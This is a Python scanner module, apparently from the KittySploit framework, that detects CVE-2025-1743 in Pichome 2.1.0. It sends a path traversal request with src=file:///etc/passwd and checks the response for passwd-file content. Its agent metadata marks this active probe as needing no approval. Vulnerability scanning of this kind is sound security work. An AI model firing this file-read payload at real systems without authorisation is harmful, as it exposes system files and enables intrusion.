#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability, which was classified as critical, was found in zyx0814 Pichome 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Pichome 2.1.0 - Arbitrary File Read Detection',
        'description': 'A vulnerability, which was classified as critical, was found in zyx0814 Pichome 2.1.0. This affects an unknown part of the file /index.php?mod=textviewer. The manipulation of the argument src leads to path traversal. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'lfi', 'pichome', 'zyx0814', 'vuln', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://github.com/sheratan4/cve/issues/4', 'https://nvd.nist.gov/vuln/detail/CVE-2025-1743'],
        'cve': 'CVE-2025-1743',
    }

    def run(self):
        r = self.http_request(method="GET", path='/index.php?mod=textviewer&src=file:///etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:', '.scrollbar__wrap',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Pichome 2.1.0 - Arbitrary File Read detected",
                path='/index.php?mod=textviewer&src=file:///etc/passwd',
            )
            return True
        return False

